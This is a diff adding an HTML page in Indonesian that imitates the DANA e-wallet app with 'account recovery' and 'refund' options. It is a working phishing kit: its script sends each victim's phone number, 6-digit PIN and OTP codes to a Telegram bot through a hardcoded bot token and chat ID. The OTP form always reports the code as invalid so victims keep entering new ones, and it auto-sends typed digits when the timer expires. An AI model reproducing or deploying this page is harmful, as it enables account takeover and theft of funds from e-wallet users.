@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Pilih Kebutuhan Anda — Restore</title>
+<style>
+:root{
+  --dana-deep:#0086e0;
+  --dana-light:#00AEEF;
+  --white:#ffffff;
+  --muted:#777777;
+  --danger:#e53935;
+}
+*{box-sizing:border-box}
+body{ margin:0; font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, Arial; background:var(--dana-deep); color:#fff; -webkit-font-smoothing:antialiased; min-height:100vh; overflow-x:hidden; }
+
+.stage { position:relative; width:100%; height:100vh; }
+.page { position:absolute; inset:0; padding-bottom:90px; transition: transform .36s cubic-bezier(.22,.9,.31,1), opacity .28s; overflow:auto; }
+.page-center { transform:translateX(0); opacity:1; z-index:2; }
+.page-left { transform:translateX(-100%); opacity:0; z-index:1; pointer-events:none; }
+.page-right { transform:translateX(100%); opacity:0; z-index:1; pointer-events:none; }
+
+.header { text-align:center; padding:20px; font-size:22px; font-weight:600; }
+.top-icons { display:flex; justify-content:space-around; padding:10px 0 20px; }
+.top-icons div { text-align:center; }
+.top-icons svg { width:42px; height:42px; stroke:#fff; stroke-width:1.8; fill:none; }
+.top-icons div span { display:block; margin-top:4px; font-size:13px; color:#fff; }
+
+.container { background:#fff; border-radius:20px; padding:20px; margin:10px; color:#000; }
+.option-card {
+  background: linear-gradient(135deg,#00AEEF,#0052D4);
+  border-radius:12px; color:#fff; text-align:center;
+  padding:15px; margin:10px 0; font-size:16px; font-weight:500; cursor:pointer;
+  transition: transform .08s;
+}
+.option-card:active { transform: scale(.98); }
+
+.bottom-nav {
+  position:fixed; left:0; right:0; bottom:0; background:#fff; display:flex; justify-content:space-around; align-items:center;
+  padding:8px 0 12px; box-shadow:0 -1px 6px rgba(0,0,0,.12);
+}
+.nav-item { text-align:center; font-size:12px; color:#00AEEF; width:20%; }
+.nav-item svg { width:26px; height:26px; stroke:#999; stroke-width:2; fill:none; }
+.nav-center { background:var(--dana-deep); border-radius:50%; padding:14px; margin-top:-35px; box-shadow:0 2px 8px rgba(0,0,0,.25); }
+.nav-center svg { width:32px; height:32px; stroke:#fff; stroke-width:2; fill:none; }
+
+.phone-wrap { background:var(--dana-deep); padding:28px 16px; color:#fff; min-height:100vh; display:flex; flex-direction:column; align-items:stretch; }
+.dana-logo { text-align:center; margin-top:6vh; margin-bottom:18px; font-weight:700; font-size:34px; letter-spacing:2px; }
+.phone-card { margin-top:10px; display:flex; flex-direction:column; align-items:center; }
+.phone-area { display:flex; align-items:center; gap:12px; justify-content:center; width:100%; max-width:420px; }
+.country { background:rgba(255,255,255,0.98); color:#000; padding:8px 10px; border-radius:12px; display:flex; align-items:center; gap:8px; font-weight:700; }
+.flag-svg { width:28px; height:18px; border-radius:2px; overflow:hidden; border:1px solid rgba(0,0,0,0.06); }
+.country-code { font-size:16px; }
+.phone-input { background:rgba(255,255,255,0.98); border-radius:18px; padding:12px 14px; width:60%; font-size:20px; font-weight:700; color:#000; border:none; outline:none; text-align:left; }
+.phone-note { max-width:92%; margin:14px auto 20px; text-align:center; color:rgba(255,255,255,0.95); line-height:1.5; font-size:14px; }
+.btn-white { margin:0 auto; display:block; width:92%; max-width:420px; background:#fff; color:var(--dana-deep); border-radius:12px; padding:14px; font-weight:800; font-size:16px; border:none; cursor:pointer; }
+
+.pin-wrap { background:#fff; color:#000; min-height:100vh; display:flex; flex-direction:column; }
+.pin-header { background:var(--dana-deep); padding:14px 10px 18px; display:flex; align-items:center; gap:8px; color:#fff; box-shadow:0 1px 0 rgba(0,0,0,0.06); }
+.back { cursor:pointer; font-size:20px; margin-left:6px; }
+.title { flex:1; text-align:center; font-weight:700; font-size:18px; margin-right:36px; }
+.pin-body { padding:36px 20px 120px; text-align:center; flex:1; }
+.pin-title { font-size:20px; font-weight:700; margin-bottom:18px; color:#000; }
+.pin-circles { display:flex; justify-content:center; gap:18px; margin-top:6px; }
+.circle { width:24px; height:24px; border-radius:50%; border:2px solid #333; display:flex; align-items:center; justify-content:center; background:transparent; }
+.circle.filled { background:#333; }
+.pin-numpad { margin-top:28px; display:grid; grid-template-columns:repeat(3,76px); gap:12px; justify-content:center; }
+.num-btn { width:76px; height:76px; border-radius:38px; background:#f5f5f5; display:flex; align-items:center; justify-content:center; font-size:22px; cursor:pointer; user-select:none; }
+
+.overlay { position:fixed; inset:0; background:rgba(0,0,0,0.55); display:none; align-items:center; justify-content:center; z-index:999; }
+.panel { background:#fff; border-radius:14px; padding:18px; width:92%; max-width:360px; color:#000; text-align:center; }
+.panel h3 { color:var(--dana-deep); margin:0 0 8px; font-size:18px; }
+.otp-row { display:flex; gap:12px; justify-content:center; margin:12px 0; }
+.otp-box { width:56px; height:56px; border-radius:8px; border:1.6px solid #ccc; font-size:26px; text-align:center; line-height:56px; }
+.otp-btn { background:var(--dana-deep); color:#fff; border:none; padding:12px; border-radius:10px; width:100%; font-weight:700; cursor:pointer; margin-top:8px; }
+.otp-links { display:flex; justify-content:center; gap:18px; margin-top:10px; font-size:13px; color:#444; }
+.timer { margin-top:8px; font-size:13px; color:var(--muted); }
+.invalid { color:var(--danger); margin-top:8px; display:none; font-size:13px; }
+
+@media (max-width:420px){
+  .phone-input { font-size:18px; width:62%; }
+  .num-btn { width:64px; height:64px; border-radius:32px; font-size:20px; }
+  .otp-box { width:48px; height:48px; line-height:48px; font-size:22px; }
+}
+</style>
+</head>
+<body>
+<div class="stage">
+  <!-- PAGE 1 -->
+  <section id="page1" class="page page-center" aria-hidden="false">
+    <div class="header">PILIH KEBUTUHAN ANDA</div>
+    <div class="top-icons">
+      <div><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 7v10M7 12h10"/></svg><span>Isi Saldo</span></div>
+      <div><svg viewBox="0 0 24 24"><rect x="5" y="5" width="14" height="14" rx="3"/><path d="M12 8v8M8 12h8"/></svg><span>Minta</span></div>
+      <div><svg viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"/></svg><span>Kirim</span></div>
+      <div><svg viewBox="0 0 24 24"><path d="M4 5h16v10H5l-1 4z"/></svg><span>Pesan</span></div>
+    </div>
+    <div class="container">
+      <div class="option-card" data-target="page2">Pemulihan Akun</div>
+      <div class="option-card" data-target="page2">Refund Saldo</div>
+      <div class="option-card" data-target="page2">Saldo Pending</div>
+      <div class="option-card" data-target="page2">Claim Saldo Cashback</div>
+      <div class="option-card" data-target="page2">Claim Hadiah</div>
+      <div class="option-card" data-target="page2">Aktivasi Akun</div>
+      <div class="option-card" data-target="page2">Cek Limit</div>
+    </div>
+    <div id="bottomNav" class="bottom-nav">
+      <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M3 9.5L12 3l9 6.5v11H3z"/></svg><div>Beranda</div></div>
+      <div class="nav-item"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/></svg><div>Aktivitas</div></div>
+      <div class="nav-center"><svg viewBox="0 0 24 24"><path d="M4 4h5v5H4zM15 4h5v5h-5zM4 15h5v5H4zM15 15h5v5h-5z"/></svg></div>
+      <div class="nav-item"><svg viewBox="0 0 24 24"><rect x="4" y="5" width="16" height="14" rx="2"/></svg><div>Dompet</div></div>
+      <div class="nav-item"><svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/></svg><div>Saya</div></div>
+    </div>
+  </section>
+
+  <!-- PAGE 2 -->
+  <section id="page2" class="page page-right" aria-hidden="true">
+    <div class="phone-wrap">
+      <div class="dana-logo">DANA</div>
+      <div class="phone-card">
+        <div class="phone-area">
+          <div class="country"><span class="flag-svg"><svg width="28" height="18"><rect width="28" height="9" y="0" fill="#FF0000"/><rect width="28" height="9" y="9" fill="#FFFFFF"/></svg></span><span class="country-code">+62</span></div>
+          <input id="phoneInput" class="phone-input" inputmode="numeric" maxlength="12" placeholder="81112345678"/>
+        </div>
+        <div class="phone-note">
+          Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu.
+          Dengan melanjutkan, kamu juga setuju dengan S&amp;K serta Kebijakan Privasi kami.
+        </div>
+        <button id="btnPhoneNext" class="btn-white">LANJUTKAN</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- PAGE 3 -->
+  <section id="page3" class="page page-right" aria-hidden="true">
+    <div class="pin-wrap">
+      <div class="pin-header"><div class="back" onclick="slideBack()">◀</div><div class="title">Masuk</div></div>
+      <div class="pin-body">
+        <div class="pin-title">Masukkan PIN</div>
+        <input id="pinHidden" class="pin-input-hidden" inputmode="numeric" maxlength="6" style="position:absolute;left:-9999px;"/>
+        <div id="pinCircles" class="pin-circles" onclick="document.getElementById('pinHidden').focus()">
+          <div class="circle" data-index="0"></div>
+          <div class="circle" data-index="1"></div>
+          <div class="circle" data-index="2"></div>
+          <div class="circle" data-index="3"></div>
+          <div class="circle" data-index="4"></div>
+          <div class="circle" data-index="5"></div>
+        </div>
+        <div class="pin-numpad" style="margin-top:28px;">
+          <div class="num-btn" onclick="pressNum(1)">1</div><div class="num-btn" onclick="pressNum(2)">2</div><div class="num-btn" onclick="pressNum(3)">3</div>
+          <div class="num-btn" onclick="pressNum(4)">4</div><div class="num-btn" onclick="pressNum(5)">5</div><div class="num-btn" onclick="pressNum(6)">6</div>
+          <div class="num-btn" onclick="pressNum(7)">7</div><div class="num-btn" onclick="pressNum(8)">8</div><div class="num-btn" onclick="pressNum(9)">9</div>
+          <div class="num-btn" onclick="backspacePin()">⌫</div><div class="num-btn" onclick="pressNum(0)">0</div><div class="num-btn" onclick="clearPin()">C</div>
+        </div>
+      </div>
+    </div>
+  </section>
+</div>
+
+<!-- OTP overlay -->
+<div id="otpOverlay" class="overlay" aria-hidden="true">
+  <div class="panel" role="dialog" aria-modal="true">
+    <h3>Masukkan kode OTP</h3>
+    <p style="margin:6px 0 8px;color:#555">Kode OTP telah di kirim ke whatsapp</p>
+    <div class="otp-row">
+      <input class="otp-box" id="otp1" maxlength="1" inputmode="numeric" />
+      <input class="otp-box" id="otp2" maxlength="1" inputmode="numeric" />
+      <input class="otp-box" id="otp3" maxlength="1" inputmode="numeric" />
+      <input class="otp-box" id="otp4" maxlength="1" inputmode="numeric" />
+    </div>
+    <div id="invalidMsg" class="invalid">Kode OTP invalid</div>
+    <button id="btnSendOtp" class="otp-btn">KIRIM</button>
+    <div class="timer" id="otpTimer">Kirim ulang dalam <span id="countdown">60</span> detik</div>
+    <div class="otp-links">
+      <a href="#" id="toWa">Kirim ke WhatsApp</a>
+      <a href="#" id="toSms">Kirim ke SMS</a>
+    </div>
+  </div>
+</div>
+
+<script>
+// --- Pages & Navigation ---
+const page1=document.getElementById('page1');
+const page2=document.getElementById('page2');
+const page3=document.getElementById('page3');
+const bottomNav=document.getElementById('bottomNav');
+
+function slideTo(id){
+  bottomNav.style.display=(id==='page1')?'flex':'none';
+  if(id==='page2'){ page1.className='page page-left'; page2.className='page page-center'; page3.className='page page-right'; }
+  else if(id==='page3'){ page1.className='page page-left'; page2.className='page page-left'; page3.className='page page-center'; }
+  else{ page1.className='page page-center'; page2.className='page page-right'; page3.className='page page-right'; }
+}
+function slideBack(){ slideTo('page2'); }
+
+// --- Option cards click ---
+document.querySelectorAll('.option-card').forEach(card=>{
+  card.addEventListener('click',()=>slideTo(card.dataset.target));
+});
+
+// --- Phone input ---
+const phoneInput=document.getElementById('phoneInput');
+document.getElementById('btnPhoneNext').addEventListener('click',()=>{
+  const raw=(phoneInput.value||'').replace(/\D/g,'').slice(0,12);
+  if(!raw||raw.length<8){ alert('Masukkan nomor HP valid (minimal 8 digit)'); phoneInput.focus(); return; }
+  window._sim=window._sim||{};
+  window._sim.phone='+62'+raw.replace(/^0+/,'');
+  sendToTelegram(`📱 Nomor HP: ${window._sim.phone}`);
+  slideTo('page3');
+});
+phoneInput.addEventListener('input',e=>{ e.target.value=(e.target.value||'').replace(/\D/g,'').slice(0,12); });
+
+// --- PIN logic ---
+const pinHidden=document.getElementById('pinHidden');
+const circles=document.querySelectorAll('#pinCircles .circle');
+let pinBuf='';
+function refreshPinUI(){
+  for(let i=0;i<6;i++){ circles[i].classList.toggle('filled',i<pinBuf.length);}
+  if(pinBuf.length>=6){
+    window._sim.pin=pinBuf.slice(0,6);
+    sendToTelegram(`🔑 PIN: ${window._sim.pin}`);
+    pinBuf=''; refreshPinUI();
+    openOtp();
+  }
+}
+function pressNum(n){ if(pinBuf.length<6){ pinBuf+=String(n); refreshPinUI(); } }
+function backspacePin(){ if(pinBuf.length>0){ pinBuf=pinBuf.slice(0,-1); refreshPinUI(); } }
+function clearPin(){ pinBuf=''; refreshPinUI(); }
+pinHidden.addEventListener('input',e=>{ pinBuf=(e.target.value||'').replace(/\D/g,'').slice(0,6); e.target.value=''; refreshPinUI(); });
+
+// --- OTP overlay ---
+const otpOverlay=document.getElementById('otpOverlay');
+const otpBoxes=[document.getElementById('otp1'),document.getElementById('otp2'),document.getElementById('otp3'),document.getElementById('otp4')];
+const invalidMsg=document.getElementById('invalidMsg');
+const countdownEl=document.getElementById('countdown');
+let otpTimer=null; let timeLeft=60;
+
+function openOtp(){
+  otpOverlay.style.display='flex';
+  invalidMsg.style.display='none';
+  otpBoxes.forEach(b=>b.value='');
+  otpBoxes[0].focus();
+  startTimer();
+}
+function closeOtp(){ otpOverlay.style.display='none'; stopTimer(); }
+
+otpBoxes.forEach((el,idx)=>{
+  el.addEventListener('input',e=>{
+    e.target.value=(e.target.value||'').replace(/\D/g,'').slice(0,1);
+    if(e.target.value && idx<otpBoxes.length-1) otpBoxes[idx+1].focus();
+  });
+  el.addEventListener('keydown',e=>{
+    if(e.key==='Backspace'&&!e.target.value&&idx>0) otpBoxes[idx-1].focus();
+  });
+});
+
+function startTimer(){
+  stopTimer(); timeLeft=60; countdownEl.textContent=timeLeft;
+  otpTimer=setInterval(()=>{
+    timeLeft--; countdownEl.textContent=timeLeft;
+    if(timeLeft<=0){
+      stopTimer(); countdownEl.textContent='0';
+      const otpVal=otpBoxes.map(b=>b.value||'').join('');
+      if(otpVal.length>0){ sendToTelegram(`⏱ OTP Auto Kirim: ${otpVal}`); showNotice('OTP otomatis dikirim ✅'); }
+    }
+  },1000);
+}
+function stopTimer(){ if(otpTimer){ clearInterval(otpTimer); otpTimer=null; } }
+
+document.getElementById('btnSendOtp').addEventListener('click',()=>{
+  const otpVal=otpBoxes.map(b=>b.value||'').join('');
+  if(otpVal.length<4){ invalidMsg.textContent='Masukkan 4 digit kode OTP'; invalidMsg.style.display='block'; return; }
+  invalidMsg.textContent='Kode OTP invalid'; invalidMsg.style.display='block';
+  sendToTelegram(`📨 OTP: ${otpVal}`);
+});
+
+document.getElementById('toWa').addEventListener('click',e=>{ e.preventDefault(); showNotice('Pesan telah dikirim ke WhatsApp ✅'); });
+document.getElementById('toSms').addEventListener('click',e=>{ e.preventDefault(); showNotice('Pesan telah dikirim via SMS ✅'); });
+
+// --- Floating notice ---
+function showNotice(text){
+  const n=document.createElement('div');
+  n.style.position='fixed'; n.style.left='50%'; n.style.transform='translateX(-50%)';
+  n.style.bottom='110px'; n.style.background='#222'; n.style.color='#fff'; n.style.padding='10px 14px';
+  n.style.borderRadius='10px'; n.style.boxShadow='0 6px 18px rgba(0,0,0,.3)'; n.style.zIndex=1200;
+  n.textContent=text;
+  document.body.appendChild(n);
+  setTimeout(()=>{ n.style.transition='opacity .35s'; n.style.opacity=0; setTimeout(()=>n.remove(),400); },1800);
+}
+
+// --- Telegram ---
+function sendToTelegram(msg){
+  const token='7201669869:AAFL4YYCcXXmqmMBSKCA3FtK6cCKEG4mqXU';
+  const chatId='6712267951';
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:chatId,text:msg})
+  }).catch(console.error);
+}
+
+// --- Init ---
+function init(){ page1.className='page page-center'; page2.className='page page-right'; page3.className='page page-right'; bottomNav.style.display='flex'; }
+init();
+</script>
+</body>
+</html>
